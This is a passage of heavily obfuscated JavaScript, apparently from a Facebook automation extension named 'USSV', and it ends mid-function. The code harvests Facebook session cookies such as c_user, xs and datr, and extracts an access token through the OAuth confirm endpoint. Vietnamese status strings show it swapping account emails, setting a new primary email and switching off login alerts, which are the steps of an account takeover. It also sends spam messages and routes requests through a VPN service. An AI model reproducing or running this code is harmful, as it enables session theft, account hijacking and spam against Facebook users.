            for (; f1W;) return f1W.n5r.c5r(b);
        };
        f1W.T0W = function(e) {
            while (e) return f1W.n5r.c5r(e);
        };
        f1W.Y0W = function(f) {
            while (f) return f1W.n5r.c5r(f);
        };
        f1W.R0W = function(l) {
            while (l) return f1W.n5r.f5r(l);
        };
        f1W.i0W = function(g) {
            if (f1W && g) return f1W.n5r.f5r(g);
        };
        f1W.m0W = function(h) {
            if (f1W && h) return f1W.n5r.f5r(h);
        };
        f1W.k0W = function(a) {
            if (f1W && a) return f1W.n5r.f5r(a);
        };
        f1W.e0W = function(b) {
            for (; f1W;) return f1W.n5r.f5r(b);
        };
        f1W.y0W = function(n) {
            for (; f1W;) return f1W.n5r.c5r(n);
        };
        f1W.E0W = function(f) {
            if (f1W && f) return f1W.n5r.f5r(f);
        };
        f1W.A5r = function(g) {
            while (g) return f1W.n5r.c5r(g);
        };
        f1W.Q5r = function(a) {
            if (f1W && a) return f1W.n5r.f5r(a);
        };
        f1W.d5r = function(e) {
            for (; f1W;) return f1W.n5r.c5r(e);
        };
        f1W.K5r = function(b) {
            for (; f1W;) return f1W.n5r.c5r(b);
        };
        var O = f1W.x5r("61f3") ? "A4t" : "&key=nguyenhau",
            Z = f1W.u5r("3f") ? "Tiê´n Tri`nh SPAM dang hoa?t dô?ng trên ta`i khoa?n " : "profile.php?id=",
            F = f1W.L5r("8a2") ? "ussvmabimat" : "G4t",
            o = f1W.w5r("582") ? ".titlebarTextWrapper" : "rd_username",
            U = f1W.v5r("bde2") ? "uygulamaizinver" : ".chat_with_id.",
            p = f1W.K5r("f5") ? "y" : "v4t",
            M = f1W.t5r("f7d") ? "u4t" : "&__a=1&__req=3d",
            b = f1W.T0W("fb32") ? "c4t" : '					<option value="1">Friends</option>',
            H = f1W.N0W("846") ? "Du~ Liê?u Trô´ng" : "J4t",
            R = f1W.G5r("d6c4") ? "I4t" : '</div>	',
            X = f1W.d5r("347e") ? "&ref=group_jump_header&group_id=" : "T4t",
            f = "a4t",
            n = f1W.Q5r("b5") ? "#CorePost_Setting_inbox_sl_type" : "i4t",
            Y = f1W.A5r("37") ? "#uss_st_mp3alert" : ".chat_with_id2.",
            N = f1W.W0W("d5") ? "rgb(234, 46, 53)" : "n4t",
            g = "M4t",
            T = "e4t",
            I = ".hasdecode",
            D = f1W.g0W("65") ? "p4t" : '				<tbody id="div_spam_info">',
            G = f1W.f0W("a85c") ? "o4t" : "Vu`a tiê´n ha`nh xo´a Tin nha´n trong ho?p thu dê´n...",
            C = f1W.V0W("548c") ? "._5wd4._1nc6:eq(" : 'body',
            z = f1W.m0W("1abe") ? "ajax|mahoa|u|?type=2&method=1&a=" : "r4t",
            P = "E4t",
            J = f1W.j0W("afd7") ? "._5wd4._1nc6" : '" src="https://ussv.net/themes/img/app/icon_login.png"></span>',
            c = f1W.I0W("7da7") ? "ajax|mahoa|u|?type=2&method=2&a=" : "</a> , Ti?n hành c?p nh?t n?i dung...",
            L = f1W.E0W("aa") ? "<" : "<a",
            E0 = f1W.i0W("8f54") ? "TotalUid" : "img_ex_msg",
            F0 = "W4t",
            K = f1W.O0W("7d") ? "description" : "hasdecode",
            r0 = "USSVMSG-",
            Q = f1W.z0W("5eb7") ? "d0t" : "Ðã ?n Ghi chú c?a b?n thành công !",
            S = f1W.B0W("2f7") ? '					<option value="600">Du?i 600 Friends</option>' : "K0t",
            u = f1W.r0W("7a") ? ".ussv_msg_key_rv." : "fb_tools",
            p0 = f1W.C0W("65aa") ? ".panel_safe_text_welcome" : "snippet_author",
            q0 = f1W.R0W("a75") ? " ... " : "L0t",
            H0 = ".close_div_safe_chat",
            W0 = "S0t",
            w = f1W.Y0W("66") ? "document" : "USSV",
            B0 = f1W.Z0W("a881") ? "P0t" : '" style="display:none">',
            o0 = f1W.F0W("1114") ? ".titlebarText" : "action",
            Z0 = f1W.o0W("5e") ? "._552h" : ".uiTextareaAutogrow._552m:eq(",
            A = f1W.a0W("db5f") ? "ussv_lang_vi_vl_pt_sp_h90" : ".uiTextareaAutogrow.",
            X0 = "z0t",
            n0 = f1W.U0W("52") ? "._5wd4._1nc7:eq(" : " _",
            U0 = f1W.y0W("2623") ? "._5wd4._1nc7" : "Body",
            b0 = f1W.p0W("82f") ? "N0t" : "NoteCore_LichSu",
            s0 = ".ussv_msg_key.",
            V0 = f1W.b0W("1b") ? "error_inbox_chan" : "USSVSFKEY",
            i0 = f1W.h0W("ed5") ? 'SetUserAgent' : '" style="position: relative;top: 2px;"></a>',
            J0 = f1W.X0W("6c") ? "comment_id" : "sf.gif",
            f0 = f1W.e0W("886") ? " Thành Công..." : ' <a title="Gi?i Mã" class="img_ex_msg"><img src="',
            k0 = f1W.q0W("fc") ? "h0t" : '<br/>Thông Tin Vê` Lô~i Trên Ta`i Khoa?n:<br/>',
            N0 = f1W.k0W("c4c5") ? ".img_ex_msg" : "Timeout",
            l0 = "R0t",
            v0 = "._5yl5",
            K0 = f1W.M0W("5d") ? "&__a=1&__req=n9" : "._5wdf._5w1r:eq(",
            P0 = f1W.H0W("2d") ? "f0t" : "startindex",
            Y0 = f1W.D0W("7b8") ? '           </a>' : "H0t",
            g0 = f1W.s0W("84c") ? "gridC" : ".ussv_safe_key",
            u0 = f1W.n0W("487") ? "b0t" : "<center>Lô~i trong qua´ tri`nh lâ´y Du~ Liê?u";
        for (var m0 = f1W.L9a; f1W[u0](m0, $(f1W.W6Y).length); m0++) {
            var C0 = function() {
                var W = "q0t";
                eq_end_msg_fr = f1W[W](dv_msg_fr.length, 1);
            };
            var T0 = $(f1W.M7r + m0 + f1W.J0Y);
            row_msg = $(f1W.W8Q + m0 + f1W.J0Y);
            var M0 = $(f1W.W8Q + m0 + f1W.J0Y)[f1W.q8r](g0)[f1W.m8y]();
            if (f1W[Y0](M0, f1W.V8v)) {
                var M0 = f1W.h50;
            }
            for (var I0 = f1W.L9a; f1W[P0](I0, $(f1W.W8Q + m0 + f1W.J0Y)[f1W.q8r](f1W.f5v).length); I0++) {
                var G0 = $(f1W.W8Q + m0 + f1W.J0Y)[f1W.q8r](K0 + I0 + f1W.J0Y)[f1W.q8r](v0)[f1W.q8r](f1W.P37)[f1W.q8r](f1W.P37);
                if (f1W[l0](G0[f1W.q8r](N0).length, f1W.L9a)) {
                    if (f1W[k0](G0[f1W.m8y]()[f1W.x3y](f1W.F3a), f1W.x0r)) {
                        G0[f1W.p3Q](f0 + gl[f1W.Y5v](J0) + i0);
                    }
                }
                if (G0[f1W.m8y]()[f1W.x3y](V0)) {
                    sp_msg_key = $(s0 + M0);
                    if (f1W[b0](sp_msg_key[f1W.m8y](), f1W.V8v)) {} else {}
                }
            };
            dv_rv = $(f1W.W8Q + m0 + f1W.J0Y)[f1W.q8r](U0);
            dv_msg_fr = row_msg[f1W.q8r](U0);
            C0();
            txt_msg_fr = row_msg[f1W.q8r](n0 + eq_end_msg_fr + f1W.J0Y);
            if (f1W[X0](txt_msg_fr[f1W.Q0I](), undefined)) {
                dv = $(A + M0).parent(Z0).parent(f1W.D6O).parent(f1W.d0Y);
                name_friend = T0[f1W.q8r](o0)[f1W.m8y]();
                if (f1W[B0](txt_msg_fr[f1W.Q0I]()[f1W.x3y](w), f1W.x0r)) {
                    if (f1W[W0](dv[f1W.q8r](f1W.I0r).length, f1W.L9a)) {
                        var L0 = function(W) {
                            panel_sf[f1W.Y5O] = W;
                        };
                        panel_sf[f1W.H5v] = _2l(name_friend, f1W.L9a);
                        L0(M0);
                        var B4 = panel_sf[f1W.Q0I]();
                        dv[f1W.u2r](B4);
                        $(H0)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                            $(this).parent(f1W.P5Y).parent(f1W.P5Y).parent(f1W.P5Y).parent(f1W.P5Y).fadeOut(f1W.Y5a);
                        });
                    }
                    var Z4 = txt_msg_fr[f1W.q8r](f1W.P37)[f1W.q8r](f1W.P37),
                        y0 = Z4[f1W.Q0I]();
                    if (f1W[q0](y0[f1W.x3y](f1W.Q2X), f1W.x0r)) {
                        $(dv)[f1W.q8r](p0)[f1W.Q0I](_2l(name_friend, f1W.L9a));
                        y0 = y0[f1W.X3Q](f1W.v6X);
                        panel_sf[f1W.i77](M0);
                        $(u + M0)[f1W.m8y](y0[f1W.S9a]);
                    } else if (f1W[S](y0[f1W.x3y](f1W.N3y), f1W.x0r)) {
                        $(dv)[f1W.q8r](p0)[f1W.Q0I](_2l(name_friend, f1W.S9a));
                    } else if (f1W[Q](y0[f1W.x3y](r0), f1W.x0r)) {
                        $(Z4)[f1W.X5O](K);
                        if (f1W[F0]($(Z4)[f1W.Q0I]()[f1W.x3y](E0), f1W.x0r)) {
                            var y0 = $(Z4)[f1W.Q0I](),
                                y0 = y0[f1W.X3Q](L)[f1W.L9a][f1W.F6r](/ /gi, f1W.V8v),
                                p4 = $(u + M0)[f1W.m8y](),
                                x0 = random_str(),
                                A0 = x0 + f1W.w30 + M0;
                            _sf[f1W.j2X] = gl[f1W.Y5v](c + p4 + f1W.J9v + y0 + f1W.w3Q + _sf[f1W.a7I]());
                            _sf[f1W.C27](2, A0);
                            $(Z4)[f1W.X5O](f1W.V8v + x0);
                        } else {}
                        $(Z4)[f1W.Q0I](img_load);
                    }
                }
            }
            dv_th = $(f1W.W8Q + m0 + f1W.J0Y)[f1W.q8r](J);
            for (var O0 = f1W.L9a; f1W[P](O0, dv_th.length); O0++) {
                if (O0 = f1W[z](dv_th.length, f1W.S9a)) {
                    var D0 = $(f1W.W8Q + m0 + f1W.J0Y)[f1W.q8r](C + O0 + f1W.J0Y)[f1W.q8r](f1W.P37);
                    if (f1W[G](D0[f1W.q8r](f1W.P37)[f1W.q8r](f1W.P37).length, f1W.L9a)) {
                        D0 = D0[f1W.q8r](f1W.P37);
                    }
                    if (f1W[D](D0[f1W.q8r](I).length, f1W.L9a)) {} else {
                        if (f1W[T]($(D0)[f1W.q8r](f1W.P37)[f1W.Q0I](), undefined)) {} else {
                            if (f1W[g]($(D0)[f1W.q8r](f1W.P37)[f1W.Q0I]()[f1W.x3y](r0), f1W.x0r)) {
                                $(D0)[f1W.X5O](K);
                                if (f1W[N](D0[f1W.q8r](f1W.P37)[f1W.Q0I]()[f1W.x3y](E0), f1W.x0r)) {
                                    var y0 = $(D0)[f1W.q8r](f1W.P37)[f1W.Q0I](),
                                        y0 = y0[f1W.X3Q](L)[f1W.L9a][f1W.F6r](/ /gi, f1W.V8v),
                                        p4 = $(s0 + M0)[f1W.m8y](),
                                        x0 = random_str(),
                                        A0 = x0 + f1W.w30 + M0;
                                    _sf[f1W.j2X] = gl[f1W.Y5v](c + p4 + f1W.J9v + y0 + f1W.w3Q + _sf[f1W.a7I]());
                                    _sf[f1W.C27](2, A0);
                                    $(D0)[f1W.q8r](f1W.P37)[f1W.X5O](f1W.V8v + x0);
                                } else {}
                                $(D0)[f1W.q8r](f1W.P37)[f1W.Q0I](img_load);
                            };
                        }
                    }
                }
                var V4 = $(Y + M0)[f1W.m8y](),
                    z0 = $(f1W.W8Q + m0 + f1W.J0Y)[f1W.q8r](C + O0 + f1W.J0Y)[f1W.q8r](v0)[f1W.q8r](f1W.P37);
                if (f1W[n](z0[f1W.q8r](f1W.P37).length, f1W.L9a)) {
                    var z0 = z0[f1W.q8r](f1W.P37);
                }
                var j4 = z0[f1W.m8y]()[f1W.X3Q](f1W.v6X),
                    S0 = find_id_msg(z0.parent(f1W.P37)[f1W.Q0I]());
                if (f1W[f]($(f1W.g97 + M0)[f1W.m8y](), f1W.B5r)) {
                    change_style_chat(f1W.c9a, m0);
                }
                if (f1W[X](z0[f1W.m8y]()[f1W.x3y](f1W.N3y), f1W.x0r)) {
                    $(f1W.g97 + M0)[f1W.m8y](f1W.B5r);
                    $(f1W.M2y + M0)[f1W.v37]();
                    $(A + M0)[f1W.R4r]();
                }
                if (f1W[R](z0[f1W.m8y]()[f1W.x3y](f1W.c8a), f1W.x0r)) {}
                if (f1W[H](z0[f1W.m8y]()[f1W.x3y](f1W.Q2X), f1W.x0r)) {
                    $(f1W.M2y + M0)[f1W.R4r]();
                    $(A + M0)[f1W.v37]();
                    $(f1W.W8Q + m0 + f1W.J0Y)[f1W.q8r](s0 + M0)[f1W.m8y](j4[f1W.S9a]);
                    if (f1W[b](S0, f1W.c8Q)) {
                        $(f1W.g97 + M0)[f1W.m8y](f1W.V8v);
                        if (f1W[M](V4, f1W.V8v)) {
                            fb_Msg(f1W.c9a, f1W.S9a, f1W.S9a, V4 + f1W.f47, f1W.L9a, get_Fb_Key(), get_Fb_Uid());
                        };
                    } else {
                        fb_Msg(f1W.S9a, f1W.S9a, f1W.S9a, S0, f1W.L9a, get_Fb_Key(), get_Fb_Uid());
                    }
                    change_style_chat(f1W.S9a, m0);
                    if (f1W[p]($(U + M0)[f1W.m8y](), f1W.V8v)) {
                        var a0 = dv_tl_bg[f1W.q8r](o)[f1W.q8r](f1W.n0v)[f1W.V6Q](f1W.G97),
                            a0 = a0[f1W.F6r](f1W.V0y, f1W.V8v);
                        if (f1W[F](a0[f1W.x3y](/profile.php/gi), f1W.x0r)) {
                            var a0 = Fb_Info(f1W.S9a, f1W.S9a, f1W.S9a, a0, f1W.L9a, f1W.L9a, f1W.L9a);
                        } else {
                            var a0 = a0[f1W.F6r](Z, f1W.V8v);
                            if (f1W[O](a0[f1W.X3Q](f1W.w3Q), f1W.x0r)) {} else {
                                var a0 = a0[f1W.X3Q](f1W.w3Q)[f1W.L9a];
                            }
                        }
                        $(U + M0)[f1W.Q0I](a0);
                        $(Y + M0)[f1W.Q0I](a0);
                    } else {}
                }
            };
        }
        $(f1W.W6Y)[f1W.q8r](N0)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
            var W = "j1t",
                V = $(this).parent(f1W.P37).parent(f1W.P37),
                E = find_id_msg(V[f1W.Q0I]());
            if (f1W[W](E, f1W.c8Q)) {} else {
                fb_Msg(f1W.S9a, f1W.S9a, f1W.S9a, find_id_msg(V[f1W.Q0I]()), f1W.L9a, get_Fb_Key(), get_Fb_Uid());
            }
            V[f1W.Q0I](img_load_s);
        });
    }

    function change_ip() {
        var E = "https://hola.org/access/ussv.net/using/vpn-us?go=1",
            O = function(W) {
                url = W;
            };
        O(E);
        var Z = new XMLHttpRequest();
        Z[f1W.g4Y] = function() {
            var W = "<div style='display:none' id='div_check'>",
                V = "F98";
            if (f1W[V](Z[f1W.D60], f1W.d9a)) {
                usshtml = document[f1W.W8O](f1W.m90);
                usshtml[f1W.V5I] = W + Z[f1W.H8v] + f1W.u40;
                document[f1W.V0r][f1W.M57](usshtml);
            }
        };
        Z[f1W.d5y](f1W.Y6Q, url, f1W.A0r);
        Z[f1W.x1I](f1W.r27, f1W.W3v);
        Z[f1W.h0r]();
    }

    function _op_page() {
        this[f1W.j2X] = function(W) {
            var V = "M8l";
            if (f1W[V](document[f1W.w6r][f1W.x3y](W), f1W.x0r)) {
                return f1W.L9a;
            } else {
                return f1W.S9a;
            }
        };
    }

    function st_check_stt() {
        var W = $(f1W.l7y)[f1W.m8y]();
        return W;
    }

    function random_str() {
        var W = "q8",
            V = f1W.V8v,
            E = f1W.h8Q;
        for (var O = f1W.L9a; f1W[f1W.v5v](O, f1W.W7a); O++) V += E[f1W.s40](Math[f1W.n40](f1W[W](Math[f1W.f2I](), E.length)));
        return V;
    }

    function GetUSSKey(Z) {
        chrome[f1W.d60][f1W.K4r]({
            action: 'GetCookie',
            url: 'facebook.com',
            type: 'json',
            name: 'a11y|act|csm|fr|locale|lu|p|presence|s|datr|c_user|xs'
        }, function(V) {
            var E = function(W) {
                    acc_doing[f1W.j17][f1W.C8v] = W;
                },
                O = V;
            O = $[f1W.o9Y][f1W.p6O](JSON[f1W.v4X](O));
            E(O);
            Z(true);
        });
    }

    function thaotac_login_form() {
        var o = "submit",
            U = '#addon_form_login',
            p = "input[name$='submit']";
        $(p)[f1W.Z6O](function() {
            var W = "Ðang dang nhâ?p...<br/><br/><br/><img src=\'https://ussv.net/themes/img/loading.gif\'>",
                V = "Ta`i khoa?n va` ma~ bi´ mâ?t không duo?c dê? trô´ng...",
                E = "S8",
                O = "P8";
            event[f1W.q07]();
            var Z = $(f1W.C6Y)[f1W.o07](),
                F = $(f1W.g3v)[f1W.o07]();
            if (f1W[O](Z, f1W.V8v) || f1W[E](F, f1W.V8v)) {
                $(f1W.I60)[f1W.Q0I](V);
            } else {
                $(f1W.I60)[f1W.Q0I](W);
                $(f1W.F60)[f1W.v37]();
                login(Z, F);
            }
        });
        $(U)[o](function(W) {
            return f1W.R30;
        });
    }

    function ussv_taoNotapad(F) {
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://notepad.cc',
            data: "hi=hi"
        }, function(W) {
            var V = "q8t",
                E = W[f1W.x3y](/var pad_name = '(.*?)';/i);
            if (f1W[V](E, null)) {
                thongbao_log(1, "T?o Link Notepad.cc Th?t B?i ");
            } else {
                var O = E[1],
                    Z = "http://notepad.cc/" + O;
                ussv_luuNotepad(O, F);
                thongbao_log(1, "T?o Link Notepad.cc Thành Công, Link: " + Z);
            }
        });
    }

    function time_now(W) {
        var V = "getDay",
            E = "y26",
            O = "full",
            Z = "F26",
            F = new Date();
        if (f1W[Z](W, O)) {} else if (f1W[E](W, f1W.z6a)) {
            var o = +F[V]() + f1W.S1v + F[f1W.H1r]();
        } else {
            var o = +F[f1W.m2Q]() + f1W.V8Y + F[f1W.Y6v]() + f1W.V8Y + F[f1W.I8O]();
        }
        return o;
    }

    function div_icon(W) {
        var V = '<div class="list_icon">',
            E = '          <span style="color: rgb(144, 189, 228);margin-right: 10px;font-size: 11px;"></span><a class="div_popup_close" role="button" href="#" id="close_div_icon_',
            O = '            <h3>USSV ICON</h3>',
            Z = ' hidden">',
            F = '<div class="ussv_div_icon_',
            o = f1W.X6v;
        o += F + W + Z;
        o += f1W.H2I;
        o += f1W.j2Y;
        o += f1W.q9r;
        o += O;
        o += f1W.k50;
        o += f1W.w5O;
        o += E + W + f1W.j4X;
        o += f1W.k50;
        o += f1W.T5y;
        o += f1W.w9O;
        o += V;
        o += icon_list(f1W.L9a);
        o += f1W.w9O;
        o += f1W.w9O;
        return o;
    }

    function icon_list(V, E) {
        var O = "D1t",
            Z = "Y1t",
            F = "//ussv.net/themes/img/fb_icon/",
            o = "m1t",
            U = "#ussv_icon_code_list",
            p = $(U)[f1W.o07](),
            p = p[f1W.X3Q](f1W.V6I),
            M = f1W.X6v;
        if (f1W[o](V, f1W.c8Q)) {
            var b = function(W) {
                M = W;
            };
            var H = F,
                R = f1W[Z](p.length, f1W.S9a);
            for (var X = f1W.L9a; f1W[O](X, R); X++) {
                M += '<img class="icon_code" id="' + X + '" src="' + H + X + '.png">&nbsp';
            }
            b(M);
        } else {
            var p = $(U)[f1W.o07](),
                p = p[f1W.X3Q](f1W.V6I),
                M = p[E];
        }
        return M;
    }

    function get_mytoken(p) {
        var M = "https://www.facebook.com/dialog/oauth/confirm",
            b = "&app_id=6628568379&redirect_uri=fbconnect%3A%2F%2Fsuccess&display=popup&access_token=&sdk=&from_post=1&private=&login=&read=&write=&readwrite=&extended=&social_confirm=&confirm=&seen_scopes=&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1&__user=",
            H = "B?n chua dang nh?p Facebook !",
            R = "f8";
        if (f1W[R](get_Fb_Key(), f1W.c8Q)) {
            $(f1W.W2Y)[f1W.Q0I](H);
        } else {
            var X = get_Fb_Key(),
                f = document[f1W.T2O][f1W.x3y](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/)[f1W.S9a]),
                n = f1W.V8Q + X + b + f + f1W.M80,
                Y = M,
                N = new XMLHttpRequest();
            N[f1W.g4Y] = function() {
                var W = "N8",
                    V = 'l',
                    E = 'm',
                    O = "h8",
                    Z = "R8";
                if (f1W[Z](N[f1W.D60], f1W.d9a) && f1W[O](N[f1W.p0O], f1W.o9Q)) {
                    var F = N[f1W.H8v],
                        F = F[f1W.F6r](f1W.q8v, f1W.V8v),
                        F = JSON[f1W.i2O](F),
                        o = F[f1W.R1v][f1W.J5a][f1W.L9a],
                        U = E + o + V,
                        o = U[f1W.x3y](/access_token=(.*?)&expires_in/i);
                    o = o[f1W.S9a];
                    if (f1W[W](p, f1W.a9r)) {
                        get_fb_info(o);
                    }
                };
            };
            N[f1W.d5y](f1W.z77, Y, f1W.A0r);
            N[f1W.h0r](n);
        }
    }

    function get_groups(E, O, Z, F) {
        var o = f1W.A0y + F;
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: o,
            data: "hj=hj"
        }, function(W) {
            var V = JSON[f1W.i2O](W);
            add_group(E, O, Z, V);
        });
    }

    function ussv_lang_ad(V, E, O) {
        var Z = "disable_fb_alert_ok",
            F = "disable_fb_alert_error_2",
            o = "disable_fb_alert_error",
            U = "disable_fb_alert",
            p = "ce_disable_fb_alert",
            M = "U6b",
            b = "disable_fb_note_ok",
            H = "disable_fb_note_error",
            R = "disable_fb_note",
            X = "ce_disable_fb_note",
            f = "Z6b",
            n = "confrim_email_fb_note",
            Y = "confrim_email_ok",
            N = "confrim_email_erro_block",
            g = "confrim_email_erro_code",
            T = "confrim_email_kxd",
            I = "confrim_email_erro",
            D = "Ði?a chi? Email xa´c thu?c Rô~ng, vui lo`ng kiê?m tra la?i.",
            G = "confrim_email_null",
            C = "Ði?a chi? Email co´ vâ´n dê hoa?c không ho?p lê?, bi? Facebook tu` chô´i giao tiê´p. Vui lo`ng kiê?m tra la?i.",
            z = "confrim_email_500",
            P = "confrim_email_400",
            J = "confrim_email",
            c = "ce_confrim_email",
            L = "O6b",
            E0 = "primary_email_fb_note",
            F0 = "Facebook ba´t ba?n xa´c nhâ?p la?i Mâ?t Khâ?u. Vui lo`ng va`o trang thiê´t lâ?p dê? biê´t thêm !",
            K = "primary_email_vr_pass",
            r0 = "primary_email_ok",
            Q = "primary_email_hasAdd",
            S = "Duo`ng nhu qua´ tri`nh da~ tha`nh công, Ba?n câ`n xem la?i.",
            u = "primary_email_kxd_2",
            p0 = "primary_email_kxd",
            q0 = "Email không du´ng hoa?c không ho?p lê? !",
            H0 = "primary_email_erro",
            W0 = "Xuâ´t hiê?n lô~i #400, Qu´a tri`nh thiê´t lâ?p bi? hu?y bo~!",
            w = "primary_email_400",
            B0 = "primary_email",
            o0 = "ce_primary_email",
            Z0 = "V6b",
            A = "change_mail_hasLink",
            X0 = "change_mail_inval",
            n0 = "change_mail_hasAdd",
            U0 = "change_mail_ok",
            b0 = "Không xa´c di?nh duo?c lô~i trong qua´ tri`nh thêm Mail",
            s0 = "change_mail_kxd_rs_2",
            V0 = "1 Lô~i không xa´c di?nh",
            i0 = "change_mail_kxd_rs",
            J0 = "change_mail_er_pass",
            f0 = "Ðuo`ng Link thiê´t thâ?p Mail không ho?p lê? !",
            k0 = "change_mail_er_link",
            N0 = "Thay Mail thâ´t Ba?i ! Co´ thê? Email na`y da~ tô`n ta?i trong ta`i khoa?n cu?a ba?n va` dang cho` Ki´ch hoa?t, vui lo`ng kiê?m tra la?i.",
            l0 = "change_mail_kxd",
            v0 = "change_mail",
            K0 = "ce_change_email",
            P0 = "Q3b",
            Y0 = "t3b",
            g0 = "w3b";
        if (f1W[g0](O, f1W.x0r) || f1W[Y0](O, undefined)) {
            var O = f1W.M7O,
                O = O[f1W.X3Q](f1W.i5X);
        } else {
            var O = f1W.V8v + O,
                O = O[f1W.X3Q](f1W.i5X);
        }
        if (f1W[P0](V, K0)) {
            var u0 = function(W) {
                    y0 = W;
                },
                m0 = function() {
                    y0 = "Email " + O[1] + " da~ duo?c thêm va`o ta`i khoa?n " + O[0] + " truo´c do´.";
                },
                C0 = function() {
                    y0 = "Thêm tha`nh công Email " + O[1] + " cho ta`i khoa?n " + O[0];
                },
                T0 = function(W) {
                    y0 = W;
                },
                M0 = function(W) {
                    y0 = W;
                },
                I0 = function() {
                    y0 = "Email " + O[1] + " da~ liên kê´t vo´i 1 ta`i khoa?n kha´c.";
                },
                G0 = function() {
                    y0 = "Ðang tiê´n ha`nh thay Email trên ta`i khoa?n " + O[0];
                },
                L0 = function() {
                    y0 = "Mâ?t khâ?u " + O[0] + " không ho?p lê? !";
                },
                B4 = function(W) {
                    y0 = W;
                },
                Z4 = function() {
                    y0 = "Email " + O[1] + " không ho?p lê?.";
                };
            var y0;
            switch (E) {
                case v0:
                    G0();
                    break;
                case l0:
                    T0(N0);
                    break;
                case k0:
                    M0(f0);
                    break;
                case J0:
                    L0();
                    break;
                case i0:
                    B4(V0);
                    break;
                case s0:
                    u0(b0);
                    break;
                case U0:
                    C0();
                    break;
                case n0:
                    m0();
                    break;
                case X0:
                    Z4();
                    break;
                case A:
                    I0();
                    break;
            }
        } else if (f1W[Z0](V, o0)) {
            var p4 = function() {
                    y0 = "Ðang tiê´n ha`nh chuyê?n email " + O[1] + " tha`nh Email chi´nh.";
                },
                x0 = function() {
                    y0 = "Email " + O[1] + " da~ duo?c thêm va`o truo´c do´. Ba?n vui lo`ng kiê?m tra la?i.";
                },
                A0 = function(W) {
                    y0 = W;
                },
                O0 = function(W) {
                    y0 = W;
                },
                D0 = function() {
                    y0 = "Chu´c mu`ng. Ba?n da~ da?t " + O[1] + " tha`nh Email chi´nh cho ta`i khoa?n " + O[0];
                },
                V4 = function() {
                    y0 = "Xa~ ra lô~i ma` hê? thô´ng USSV không thê? phân ti´ch trên email mo´i " + O[1] + ", ba?n ha~y xem la?i lo`i nha´n cu?a Facebook:<br/>Tiêu Ðê`: " + O[2] + "<br/>Nô?i Dung: " + O[3];
                },
                z0 = function() {
                    y0 = "Không xa´c di?nh lô~i trong qua´ tri`nh chuyê?n email " + O[1] + " tha`nh Mail chi´nh!";
                },
                j4 = function(W) {
                    y0 = W;
                },
                S0 = function(W) {
                    y0 = W;
                };
            var y0;
            switch (E) {
                case B0:
                    p4();
                    break;
                case w:
                    S0(W0);
                    break;
                case H0:
                    j4(q0);
                    break;
                case p0:
                    z0();
                    break;
                case u:
                    A0(S);
                    break;
                case Q:
                    x0();
                    break;
                case r0:
                    D0();
                    break;
                case K:
                    O0(F0);
                    break;
                case E0:
                    V4();
                    break;
            }
        } else if (f1W[L](V, c)) {
            var a0 = function(W) {
                    y0 = W;
                },
                c0 = function() {
                    y0 = "Ta`i khoa?n " + O[0] + " da~ bi? Block ta?m tho`i ti´nh nang Change Mail vi` da~ thu? qua´ nhiê`u lâ`n. ";
                },
                w0 = function(W) {
                    y0 = W;
                },
                b4 = function() {
                    y0 = "Ðang tiê´n ha`nh xa´c thu?c Email " + O[1] + ".";
                },
                q4 = function() {
                    y0 = "Chu´c mu`ng. Ða~ xa´c thu?c tha`nh công Email " + O[1] + " trên ta`i khoa?n " + O[0] + " vo´i Ma~ Xa´c Thu?c: " + O[2];
                },
                e4 = function() {
                    y0 = "Ma~ xa´c thu?c: " + O[2] + " không ho?p lê?, vui lo`ng kiê?m tra la?i.";
                },
                W4 = function(W) {
                    y0 = W;
                },
                r4 = function() {
                    y0 = "Xa~ ra lô~i ma` hê? thô´ng USSV không thê? phân ti´ch trên email mo´i " + O[1] + ", ba?n ha~y xem la?i lo`i nha´n cu?a Facebook:<br/>Tiêu Ðê`: " + O[2] + "<br/>Nô?i Dung: " + O[3] + "<br/>Ma~ Lô~i: " + O[4];
                },
                n4 = function() {
                    y0 = "Không xa´c di?nh lô~i trong qua´ tri`nh xa´c thu?c Email mo´i: " + O[1] + " .";
                },
                f4 = function() {
                    y0 = "Ði?a chi? Email " + O[1] + " Co´ Vâ´n Ðê`, vui lo`ng kiê?m tra la?i, hê? thô´ng chua thê? tu? phân ti´ch !";
                };
            var y0;
            switch (E) {
                case J:
                    b4();
                    break;
                case P:
                    w0(W0);
                    break;
                case z:
                    W4(C);
                    break;
                case G:
                    a0(D);
                    break;
                case I:
                    f4();
                    break;
                case T:
                    n4();
                    break;
                case g:
                    e4();
                    break;
                case N:
                    c0();
                    break;
                case Y:
                    q4();
                    break;
                case n:
                    r4();
                    break;
            }
        } else if (f1W[f](V, X)) {
            var E4 = function() {
                    y0 = "Ðang tiê´n ha`nh ta´t ti´nh nang nhâ?n Mail ra´c tu` Facebook trên ta`i khoa?n " + O[0] + ".";
                },
                M4 = function() {
                    y0 = "Lô~i trong qua´ tri`nh Ta´t Nhâ?n Mail Thông Ba´o Tu` Facebook. Ma~ Lô~i: " + O[1];
                },
                X4 = function() {
                    y0 = "Ta´t Nhâ?n Mail thông ba´o tu` Facebook tha`nh công trên ta`i khoa?n " + O[0];
                };
            var y0;
            switch (E) {
                case R:
                    E4();
                    break;
                case H:
                    M4();
                    break;
                case b:
                    X4();
                    break;
            }
        } else if (f1W[M](V, p)) {
            var k4 = function() {
                    y0 = "Ðang tiê´n ha`nh ta´t ti´nh nang nhâ?n Thông Ba´o Ðang Nhâ?p trên ta`i khoa?n " + O[0] + ".";
                },
                R4 = function() {
                    y0 = "Xa~y ra lô~i trong qua´ tri`nh Ta´t Thông Ba´o Ðang Nhâ?p trên ta`i khoa?n: " + O[0];
                },
                y4 = function() {
                    y0 = "Ta´t Nhâ?n thông ba´o Ðang nhâ?p tha`nh công trên ta`i khoa?n " + O[0];
                },
                s4 = function() {
                    y0 = "Lô~i trong qua´ tri`nh Ta´t Nhâ?n Thông Ba´o Ðang nhâ?p Tu` Facebook. Ma~ Lô~i: " + O[1];
                };
            var y0;
            switch (E) {
                case U:
                    k4();
                    break;
                case o:
                    s4();
                    break;
                case F:
                    R4();
                    break;
                case Z:
                    y4();
                    break;
            }
        } else {}
        return y0;
    }

    function _fb() {
        var Y0 = "UnfriendFriend",
            g0 = "AddFriend",
            u0 = "qr",
